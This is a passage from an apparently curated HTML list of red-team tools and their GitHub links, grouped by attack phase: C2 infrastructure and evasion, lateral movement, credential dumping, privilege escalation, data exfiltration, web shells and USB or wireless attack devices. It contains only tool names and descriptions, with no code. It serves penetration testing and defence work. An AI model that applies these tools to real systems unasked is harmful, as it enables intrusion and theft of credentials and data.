title="Staging"></a>Staging</h3><ul><li><strong>Rapid Attack Infrastructure (RAI)</strong> Red Team Infrastructureâ€¦ Quickâ€¦ Fastâ€¦ Simplified<br>One of the most tedious phases of a Red Team Operation is usually the infrastructure setup. This usually entails<br>a teamserver or controller, domains, redirectors, and a Phishing server. <a href="https://github.com/obscuritylabs/RAI" target="_blank" rel="noopener">https://github.com/obscuritylabs/RAI</a></li><li><strong>Red Baron</strong> is a set of modules and custom/third-party providers for Terraform which tries to automate creating resilient, disposable, secure and agile infrastructure for Red Teams. <a href="https://github.com/byt3bl33d3r/Red-Baron" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/Red-Baron</a></li><li><strong>EvilURL</strong> generate unicode evil domains for IDN Homograph Attack and detect them. <a href="https://github.com/UndeadSec/EvilURL" target="_blank" rel="noopener">https://github.com/UndeadSec/EvilURL</a></li><li><strong>Domain Hunter</strong> checks expired domains, bluecoat categorization, and Archive.org history to determine good candidates for phishing and C2 domain names. <a href="https://github.com/threatexpress/domainhunter" target="_blank" rel="noopener">https://github.com/threatexpress/domainhunter</a></li><li><strong>PowerDNS</strong> is a simple proof of concept to demonstrate the execution of PowerShell script using DNS only. <a href="https://github.com/mdsecactivebreach/PowerDNS" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/PowerDNS</a></li><li><strong>Chameleon</strong> a tool for evading Proxy categorisation. <a href="https://github.com/mdsecactivebreach/Chameleon" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/Chameleon</a></li><li><strong>CatMyFish</strong> Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike beacon C&amp;C. <a href="https://github.com/Mr-Un1k0d3r/CatMyFish" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/CatMyFish</a></li><li><strong>Malleable C2</strong> is a domain specific language to redefine indicators in Beaconâ€™s communication. <a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles</a></li><li><strong>Malleable-C2-Randomizer</strong> This script randomizes Cobalt Strike Malleable C2 profiles through the use of a metalanguage, hopefully reducing the chances of flagging signature-based detection controls. <a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer</a></li><li><strong>FindFrontableDomains</strong> search for potential frontable domains. <a href="https://github.com/rvrsh3ll/FindFrontableDomains" target="_blank" rel="noopener">https://github.com/rvrsh3ll/FindFrontableDomains</a></li><li><strong>Postfix-Server-Setup</strong> Setting up a phishing server is a very long and tedious process. It can take hours to setup, and can be compromised in minutes. <a href="https://github.com/n0pe-sled/Postfix-Server-Setup" target="_blank" rel="noopener">https://github.com/n0pe-sled/Postfix-Server-Setup</a></li><li><strong>DomainFrontingLists</strong> a list of Domain Frontable Domains by CDN. <a href="https://github.com/vysec/DomainFrontingLists" target="_blank" rel="noopener">https://github.com/vysec/DomainFrontingLists</a></li><li><strong>Apache2-Mod-Rewrite-Setup</strong> Quickly Implement Mod-Rewrite in your infastructure. <a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup" target="_blank" rel="noopener">https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup</a></li><li><strong>mod_rewrite rule</strong> to evade vendor sandboxes. <a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10" target="_blank" rel="noopener">https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10</a></li><li><strong>external_c2 framework</strong> a python framework for usage with Cobalt Strikeâ€™s External C2. <a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">https://github.com/Und3rf10w/external_c2_framework</a></li><li><strong>ExternalC2</strong> a library for integrating communication channels with the Cobalt Strike External C2 server. <a href="https://github.com/ryhanson/ExternalC2" target="_blank" rel="noopener">https://github.com/ryhanson/ExternalC2</a></li><li><strong>cs2modrewrite</strong> a tools for convert Cobalt Strike profiles to modrewrite scripts. <a href="https://github.com/threatexpress/cs2modrewrite" target="_blank" rel="noopener">https://github.com/threatexpress/cs2modrewrite</a></li><li><strong>e2modrewrite</strong> a tools for convert Empire profiles to Apache modrewrite scripts. <a href="https://github.com/infosecn1nja/e2modrewrite" target="_blank" rel="noopener">https://github.com/infosecn1nja/e2modrewrite</a></li><li><strong>redi</strong> automated script for setting up CobaltStrike redirectors (nginx reverse proxy, letsencrypt). <a href="https://github.com/taherio/redi" target="_blank" rel="noopener">https://github.com/taherio/redi</a></li><li><strong>Domain Fronting Google App Engine</strong>. <a href="https://github.com/redteam-cyberark/Google-Domain-fronting" target="_blank" rel="noopener">https://github.com/redteam-cyberark/Google-Domain-fronting</a></li><li><strong>DomainFrontDiscover</strong> Scripts and results for finding domain frontable CloudFront domains. <a href="https://github.com/peewpw/DomainFrontDiscover" target="_blank" rel="noopener">https://github.com/peewpw/DomainFrontDiscover</a></li><li><strong>Automated Empire Infrastructure</strong> <a href="https://github.com/bneg/RedTeam-Automation" target="_blank" rel="noopener">https://github.com/bneg/RedTeam-Automation</a></li><li><strong>Serving Random Payloads</strong> with NGINX. <a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9" target="_blank" rel="noopener">https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9</a></li><li><strong>meek</strong> is a blocking-resistant pluggable transport for Tor. It encodes a<br>data stream as a sequence of HTTPS requests and responses. <a href="https://github.com/arlolra/meek" target="_blank" rel="noopener">https://github.com/arlolra/meek</a></li><li><strong>CobaltStrike-ToolKit</strong> Some useful scripts for CobaltStrike. <a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit" target="_blank" rel="noopener">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a></li><li><strong>mkhtaccess_red</strong> Auto-generate an HTaccess for payload delivery â€“ automatically pulls ips/nets/etc from known sandbox companies/sources that have been seen before, and redirects them to a benign payload. <a href="https://github.com/violentlydave/mkhtaccess_red" target="_blank" rel="noopener">https://github.com/violentlydave/mkhtaccess_red</a></li><li><strong>RedFile</strong> a flask wsgi application that serves files with intelligence, good for serving conditional RedTeam payloads. <a href="https://github.com/outflanknl/RedFile" target="_blank" rel="noopener">https://github.com/outflanknl/RedFile</a></li><li><strong>keyserver</strong> Easily serve HTTP and DNS keys for proper payload protection. <a href="https://github.com/leoloobeek/keyserver" target="_blank" rel="noopener">https://github.com/leoloobeek/keyserver</a></li><li><strong>DoHC2</strong> allows the ExternalC2 library from Ryan Hanson (<a href="https://github.com/ryhanson/ExternalC2" target="_blank" rel="noopener">https://github.com/ryhanson/ExternalC2</a>) to be leveraged for command and control (C2) via DNS over HTTPS (DoH). This is built for the popular Adversary Simulation and Red Team Operations Software Cobalt Strike (<a href="https://www.cobaltstrike.com" target="_blank" rel="noopener">https://www.cobaltstrike.com</a>). <a href="https://github.com/SpiderLabs/DoHC2" target="_blank" rel="noopener">https://github.com/SpiderLabs/DoHC2</a></li><li><strong>cat-sites</strong> Library of sites for categorization. <a href="https://github.com/audrummer15/cat-sites" target="_blank" rel="noopener">https://github.com/audrummer15/cat-sites</a></li></ul><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><ul><li><strong>CrackMapExec</strong> is a swiss army knife for pentesting networks. <a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></li><li><strong>PowerLessShell</strong> rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. <a href="https://github.com/Mr-Un1k0d3r/PowerLessShell" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/PowerLessShell</a></li><li><strong>GoFetch</strong> is a tool to automatically exercise an attack plan generated by the BloodHound application.<br> <a href="https://github.com/GoFetchAD/GoFetch" target="_blank" rel="noopener">https://github.com/GoFetchAD/GoFetch</a></li><li><strong>ANGRYPUPPY</strong> a bloodhound attack path automation in CobaltStrike. <a href="https://github.com/vysec/ANGRYPUPPY" target="_blank" rel="noopener">https://github.com/vysec/ANGRYPUPPY</a></li><li><strong>DeathStar</strong> is a Python script that uses Empireâ€™s RESTful API to automate gaining Domain Admin rights in Active Directory environments using a variety of techinques. <a href="https://github.com/byt3bl33d3r/DeathStar" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/DeathStar</a></li><li><strong>SharpHound</strong> C# Rewrite of the BloodHound Ingestor. <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/SharpHound</a></li><li><strong>BloodHound.py</strong> is a Python based ingestor for BloodHound, based on Impacket. <a href="https://github.com/fox-it/BloodHound.py" target="_blank" rel="noopener">https://github.com/fox-it/BloodHound.py</a></li><li><strong>Responder</strong> is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. <a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></li><li><strong>SessionGopher</strong> is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally. <a href="https://github.com/fireeye/SessionGopher" target="_blank" rel="noopener">https://github.com/fireeye/SessionGopher</a></li><li><strong>PowerSploit</strong> is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></li><li><strong>Nishang</strong> is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></li><li><strong>Inveigh</strong> is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool. <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></li><li><strong>PowerUpSQL</strong> a PowerShell Toolkit for Attacking SQL Server. <a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></li><li><strong>MailSniper</strong> is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). <a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">https://github.com/dafthack/MailSniper</a></li><li><strong>WMIOps</strong> is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment. Itâ€™s designed primarily for use on penetration tests or red team engagements. <a href="https://github.com/ChrisTruncer/WMIOps" target="_blank" rel="noopener">https://github.com/ChrisTruncer/WMIOps</a></li><li><strong>Mimikatz</strong> is an open-source utility that enables the viewing of credential information from the Windows lsass. <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></li><li><strong>LaZagne</strong> project is an open source application used to retrieve lots of passwords stored on a local computer. <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li><li><strong>mimipenguin</strong> a tool to dump the login password from the current linux desktop user. Adapted from the idea behind the popular Windows tool mimikatz. <a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></li><li><strong>PsExec</strong> is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></li><li><strong>KeeThief</strong> allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system. <a href="https://github.com/HarmJ0y/KeeThief" target="_blank" rel="noopener">https://github.com/HarmJ0y/KeeThief</a></li><li><strong>PSAttack</strong> combines some of the best projects in the infosec powershell community into a self contained custom PowerShell console. <a href="https://github.com/jaredhaight/PSAttack" target="_blank" rel="noopener">https://github.com/jaredhaight/PSAttack</a></li><li><strong>Internal Monologue Attack</strong> Retrieving NTLM Hashes without Touching LSASS. <a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="noopener">https://github.com/eladshamir/Internal-Monologue</a></li><li><strong>Impacket</strong> is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (for instance NMB, SMB1-3 and MS-DCERPC) the protocol implementation itself. <a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></li><li><strong>icebreaker</strong> gets plaintext Active Directory credentials if youâ€™re on the internal network but outside the AD environment. <a href="https://github.com/DanMcInerney/icebreaker" target="_blank" rel="noopener">https://github.com/DanMcInerney/icebreaker</a></li><li><strong>Living Off The Land Binaries and Scripts (and now also Libraries)</strong> The goal of these lists are to document every binary, script and library that can be used for other purposes than they are designed to. <a href="https://github.com/api0cradle/LOLBAS" target="_blank" rel="noopener">https://github.com/api0cradle/LOLBAS</a></li><li><strong>WSUSpendu</strong> for compromised WSUS server to extend the compromise to clients. <a href="https://github.com/AlsidOfficial/WSUSpendu" target="_blank" rel="noopener">https://github.com/AlsidOfficial/WSUSpendu</a></li><li><strong>Evilgrade</strong> is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. <a href="https://github.com/infobyte/evilgrade" target="_blank" rel="noopener">https://github.com/infobyte/evilgrade</a></li><li><strong>NetRipper</strong> is a post exploitation tool targeting Windows systems which uses API hooking in order to intercept network traffic and encryption related functions from a low privileged user, being able to capture both plain-text traffic and encrypted traffic before encryption/after decryption. <a href="https://github.com/NytroRST/NetRipper" target="_blank" rel="noopener">https://github.com/NytroRST/NetRipper</a></li><li><strong>LethalHTA</strong> Lateral Movement technique using DCOM and HTA. <a href="https://github.com/codewhitesec/LethalHTA" target="_blank" rel="noopener">https://github.com/codewhitesec/LethalHTA</a></li><li><strong>Invoke-PowerThIEf</strong> an Internet Explorer Post Exploitation library. <a href="https://github.com/nettitude/Invoke-PowerThIEf" target="_blank" rel="noopener">https://github.com/nettitude/Invoke-PowerThIEf</a></li><li><strong>RedSnarf</strong> is a pen-testing / red-teaming tool for Windows environments. <a href="https://github.com/nccgroup/redsnarf" target="_blank" rel="noopener">https://github.com/nccgroup/redsnarf</a></li><li><strong>HoneypotBuster</strong> Microsoft PowerShell module designed for red teams that can be used to find honeypots and honeytokens in the network or at the host. <a href="https://github.com/JavelinNetworks/HoneypotBuster" target="_blank" rel="noopener">https://github.com/JavelinNetworks/HoneypotBuster</a></li></ul><h2 id="Establish-Foothold"><a href="#Establish-Foothold" class="headerlink" title="Establish Foothold"></a>Establish Foothold</h2><ul><li><strong>Tunna</strong> is a set of tools which will wrap and tunnel any TCP communication over HTTP. It can be used to bypass network restrictions in fully firewalled environments. <a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></li><li><strong>reGeorg</strong> the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></li><li><strong>Blade</strong> is a webshell connection tool based on console, currently under development and aims to be a choice of replacement of Chooper. <a href="https://github.com/wonderqs/Blade" target="_blank" rel="noopener">https://github.com/wonderqs/Blade</a></li><li><strong>TinyShell</strong> Web Shell Framework. <a href="https://github.com/threatexpress/tinyshell" target="_blank" rel="noopener">https://github.com/threatexpress/tinyshell</a></li><li><strong>PowerLurk</strong> is a PowerShell toolset for building malicious WMI Event Subsriptions. <a href="https://github.com/Sw4mpf0x/PowerLurk" target="_blank" rel="noopener">https://github.com/Sw4mpf0x/PowerLurk</a></li><li><strong>DAMP</strong> The Discretionary ACL Modification Project: Persistence Through Host-based Security Descriptor Modification.<br><a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="noopener">https://github.com/HarmJ0y/DAMP</a></li></ul><h2 id="Escalate-Privileges"><a href="#Escalate-Privileges" class="headerlink" title="Escalate Privileges"></a>Escalate Privileges</h2><h3 id="Domain-Escalation"><a href="#Domain-Escalation" class="headerlink" title="Domain Escalation"></a>Domain Escalation</h3><ul><li><strong>PowerView</strong> is a PowerShell tool to gain network situational awareness on Windows domains. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></li><li><strong>Get-GPPPassword</strong> Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></li><li><strong>Invoke-ACLpwn</strong> is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured. <a href="https://github.com/fox-it/Invoke-ACLPwn" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-ACLPwn</a></li><li><strong>BloodHound</strong> uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></li><li><strong>PyKEK</strong> (Python Kerberos Exploitation Kit), a python library to manipulate KRB5-related data. <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a></li><li><strong>Grouper</strong> a PowerShell script for helping to find vulnerable settings in AD Group Policy.<br><a href="https://github.com/l0ss/Grouper" target="_blank" rel="noopener">https://github.com/l0ss/Grouper</a></li><li><strong>ADRecon</strong> is a tool which extracts various artifacts (as highlighted below) out of an AD environment in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis. <a href="https://github.com/sense-of-security/ADRecon" target="_blank" rel="noopener">https://github.com/sense-of-security/ADRecon</a></li><li><strong>ADACLScanner</strong> one script for ACLâ€™s in Active Directory. <a href="https://github.com/canix1/ADACLScanner" target="_blank" rel="noopener">https://github.com/canix1/ADACLScanner</a></li><li><strong>LAPSToolkit</strong> a tool to audit and attack LAPS environments. <a href="https://github.com/leoloobeek/LAPSToolkit" target="_blank" rel="noopener">https://github.com/leoloobeek/LAPSToolkit</a></li><li><strong>PingCastle</strong> is a free, Windows-based utility to audit the risk level of your AD infrastructure and check for vulnerable practices. <a href="https://www.pingcastle.com/download" target="_blank" rel="noopener">https://www.pingcastle.com/download</a></li><li><strong>RiskySPNs</strong> is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). <a href="https://github.com/cyberark/RiskySPN" target="_blank" rel="noopener">https://github.com/cyberark/RiskySPN</a></li><li><strong>Mystique</strong> is a PowerShell tool to play with Kerberos S4U extensions, this module can assist blue teams to identify risky Kerberos delegation configurations as well as red teams to impersonate arbitrary users by leveraging KCD with Protocol Transition. <a href="https://github.com/machosec/Mystique" target="_blank" rel="noopener">https://github.com/machosec/Mystique</a></li><li><strong>Rubeus</strong> is a C# toolset for raw Kerberos interaction and abuses. It is heavily adapted from Benjamin Delpyâ€™s Kekeo project. <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></li><li><strong>kekeo</strong> is a little toolbox I have started to manipulate Microsoft Kerberos in C (and for fun). <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></li></ul><h3 id="Local-Escalation"><a href="#Local-Escalation" class="headerlink" title="Local Escalation"></a>Local Escalation</h3><ul><li><strong>UACMe</strong> is an open source assessment tool that contains many methods for bypassing Windows User Account Control on multiple versions of the operating system. <a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></li><li><strong>windows-kernel-exploits</strong> a collection windows kernel exploit. <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li><li><strong>PowerUp</strong> aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></li><li><strong>The Elevate Kit</strong> demonstrates how to use third-party privilege escalation attacks with Cobalt Strikeâ€™s Beacon payload. <a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></li><li><strong>Sherlock</strong> a powerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.<br> <a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock</a></li><li><strong>Tokenvator</strong> a tool to elevate privilege with Windows Tokens. <a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="noopener">https://github.com/0xbadjuju/Tokenvator</a></li></ul><h2 id="Data-Exfiltration"><a href="#Data-Exfiltration" class="headerlink" title="Data Exfiltration"></a>Data Exfiltration</h2><ul><li><strong>CloakifyFactory</strong> &amp; the Cloakify Toolset - Data Exfiltration &amp; Infiltration In Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat Data Whitelisting Controls; Evade AV Detection. <a href="https://github.com/TryCatchHCF/Cloakify" target="_blank" rel="noopener">https://github.com/TryCatchHCF/Cloakify</a></li><li><strong>DET</strong> (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. <a href="https://github.com/sensepost/DET" target="_blank" rel="noopener">https://github.com/sensepost/DET</a></li><li><strong>DNSExfiltrator</strong> allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. <a href="https://github.com/Arno0x/DNSExfiltrator" target="_blank" rel="noopener">https://github.com/Arno0x/DNSExfiltrator</a></li><li><strong>PyExfil</strong> a Python Package for Data Exfiltration. <a href="https://github.com/ytisf/PyExfil" target="_blank" rel="noopener">https://github.com/ytisf/PyExfil</a></li><li><strong>Egress-Assess</strong> is a tool used to test egress data detection capabilities. <a href="https://github.com/ChrisTruncer/Egress-Assess" target="_blank" rel="noopener">https://github.com/ChrisTruncer/Egress-Assess</a></li><li><strong>Powershell RAT</strong> python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. <a href="https://github.com/Viralmaniar/Powershell-RAT" target="_blank" rel="noopener">https://github.com/Viralmaniar/Powershell-RAT</a></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Wireless-Networks"><a href="#Wireless-Networks" class="headerlink" title="Wireless Networks"></a>Wireless Networks</h3><ul><li><strong>Wifiphisher</strong> is a security tool that performs Wi-Fi automatic association attacks to force wireless clients to unknowingly connect to an attacker-controlled Access Point. <a href="https://github.com/wifiphisher/wifiphisher" target="_blank" rel="noopener">https://github.com/wifiphisher/wifiphisher</a></li><li><strong>Evilginx</strong> is a man-in-the-middle attack framework used for phishing credentials and session cookies of any web service. <a href="https://github.com/kgretzky/evilginx" target="_blank" rel="noopener">https://github.com/kgretzky/evilginx</a></li><li><strong>mana</strong> toolkit for wifi rogue AP attacks and MitM. <a href="https://github.com/sensepost/mana" target="_blank" rel="noopener">https://github.com/sensepost/mana</a></li></ul><h3 id="Embedded-amp-Peripheral-Devices-Hacking"><a href="#Embedded-amp-Peripheral-Devices-Hacking" class="headerlink" title="Embedded &amp; Peripheral Devices Hacking"></a>Embedded &amp; Peripheral Devices Hacking</h3><ul><li><strong>magspoof</strong> a portable device that can spoof/emulate any magnetic stripe, credit card or hotel card â€œwirelesslyâ€, even on standard magstripe (non-NFC/RFID) readers. <a href="https://github.com/samyk/magspoof" target="_blank" rel="noopener">https://github.com/samyk/magspoof</a></li><li><strong>WarBerryPi</strong> was built to be used as a hardware implant during red teaming scenarios where we want to obtain as much information as possible in a short period of time with being as stealth as possible. <a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></li><li><strong>P4wnP1</strong> is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor). <a href="https://github.com/mame82/P4wnP1" target="_blank" rel="noopener">https://github.com/mame82/P4wnP1</a></li><li><strong>malusb</strong> HID spoofing multi-OS payload for Teensy. <a href="https://github.com/ebursztein/malusb" target="_blank" rel="noopener">https://github.com/ebursztein/malusb</a></li><li><strong>Fenrir</strong> is a tool designed to be used â€œout-of-the-boxâ€ for penetration tests and offensive engagements. Its main feature and purpose is to bypass wired 802.1x protection and to give you an access to the target network. <a href="https://github.com/Orange-Cyberdefense/fenrir-ocd" target="_blank" rel="noopener">https://github.com/Orange-Cyberdefense/fenrir-ocd</a></li><li><strong>poisontap</strong> exploits locked/password protected computers over USB, drops persistent WebSocket-based backdoor, exposes internal router, and siphons cookies using Raspberry Pi Zero &amp; Node.js. <a href="https://github.com/samyk/poisontap" target="_blank" rel="noopener">https://github.com/samyk/poisontap</a></li><li><strong>WHID</strong> WiFi HID Injector - An USB Rubberducky / BadUSB On Steroids.<br><a href="https://github.com/whid-injector/WHID" target="_blank" rel="noopener">https://github.com/whid-injector/WHID</a></li></ul><h3 id="Software-For-Team-Communication"><a href="#Software-For-Team-Communication" class="headerlink" title="Software For Team Communication"></a>Software For Team Communication</h3><ul><li><strong>RocketChat</strong> is free, unlimited and open source. Replace email &amp; Slack with the ultimate team chat software solution. <a href="https://rocket.chat" target="_blank" rel="noopener">https://rocket.chat</a></li><li><strong>Etherpad</strong> is an open source, web-based collaborative real-time editor, allowing authors to simultaneously edit a text document <a href="https://etherpad.net" target="_blank" rel="noopener">https://etherpad.net</a></li></ul><h3 id="Log-Aggregation"><a href="#Log-Aggregation" class="headerlink" title="Log Aggregation"></a>Log Aggregation</h3><ul><li><strong>RedELK</strong> Red Teamâ€™s SIEM - easy deployable tool for Red Teams used for tracking and alarming about Blue Team activities as well as better usability in long term operations. <a href="https://github.com/outflanknl/RedELK/" target="_blank" rel="noopener">https://github.com/outflanknl/RedELK/</a></li><li><strong>CobaltSplunk</strong> Splunk Dashboard for CobaltStrike logs. <a href="https://github.com/vysec/CobaltSplunk" target="_blank" rel="noopener">https://github.com/vysec/CobaltSplunk</a></li><li><strong>Red Team Telemetry</strong> A collection of scripts and configurations to enable centralized logging of red team infrastructure. <a href="https://github.com/ztgrace/red_team_telemetry" target="_blank" rel="noopener">https://github.com/ztgrace/red_team_telemetry</a></li><li><strong>Elastic for Red Teaming</strong> Repository of resources for configuring a Red Team SIEM using Elastic. <a href="https://github.com/SecurityRiskAdvisors/RedTeamSIEM" target="_blank" rel="noopener">https://github.com/SecurityRiskAdvisors/RedTeamSIEM</a></li></ul><h3 id="C-Offensive-Framework"><a href="#C-Offensive-Framework" class="headerlink" title="C# Offensive Framework"></a>C# Offensive Framework</h3><ul><li><strong>SharpSploit</strong> is a .NET post-exploitation library written in C# that aims to highlight the attack surface of .NET and make the use of offensive .NET easier for red teamers. <a href="https://github.com/cobbr/SharpSploit" target="_blank" rel="noopener">https://github.com/cobbr/SharpSploit</a></li><li><strong>GhostPack</strong> is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- Seatbelt, SharpUp, SharpRoast, SharpDump, SafetyKatz, and SharpWMI. <a href="https://github.com/GhostPack" target="_blank" rel="noopener">https://github.com/GhostPack</a></li><li><strong>SharpWeb</strong> .NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge. <a href="https://github.com/djhohnstein/SharpWeb" target="_blank" rel="noopener">https://github.com/djhohnstein/SharpWeb</a></li><li><strong>reconerator</strong> C# Targeted Attack Reconnissance Tools. <a href="https://github.com/stufus/reconerator" target="_blank" rel="noopener">https://github.com/stufus/reconerator</a></li><li><strong>SharpView</strong> C# implementation of harmj0yâ€™s PowerView. <a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></li><li><strong>Watson</strong> is a (.NET 2.0 compliant) C# implementation of Sherlock. <a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener">https://github.com/rasta-mouse/Watson</a></li></ul><h3 id="Labs"><a href="#Labs" class="headerlink" title="Labs"></a>Labs</h3><ul><li><strong>Detection Lab</strong> This lab has been designed with defenders in mind. Its primary purpose is to allow the user to quickly build a Windows domain that comes pre-loaded with security tooling and some best practices when it comes to system logging configurations. <a href="https://github.com/clong/DetectionLab" target="_blank" rel="noopener">https://github.com/clong/DetectionLab</a></li><li><strong>Modern Windows Attacks and Defense Lab</strong> This is the lab configuration for the Modern Windows Attacks and Defense class that Sean Metcalf (@pyrotek3) and I teach. <a href="https://github.com/jaredhaight/WindowsAttackAndDefenseLab" target="_blank" rel="noopener">https://github.com/jaredhaight/WindowsAttackAndDefenseLab</a></li><li><strong>Invoke-UserSimulator</strong> Simulates common user behaviour on local and remote Windows hosts. <a href="https://github.com/ubeeri/Invoke-UserSimulator" target="_blank" rel="noopener">https://github.com/ubeeri/Invoke-UserSimulator</a></li><li><strong>Invoke-ADLabDeployer</strong> Automated deployment of Windows and Active Directory test lab networks. Useful for red and blue teams. <a href="https://github.com/outflanknl/Invoke-ADLabDeployer" target="_blank" rel="noopener">https://github.com/outflanknl/Invoke-ADLabDeployer</a></li><li><strong>Sheepl</strong> Creating realistic user behaviour for supporting tradecraft development 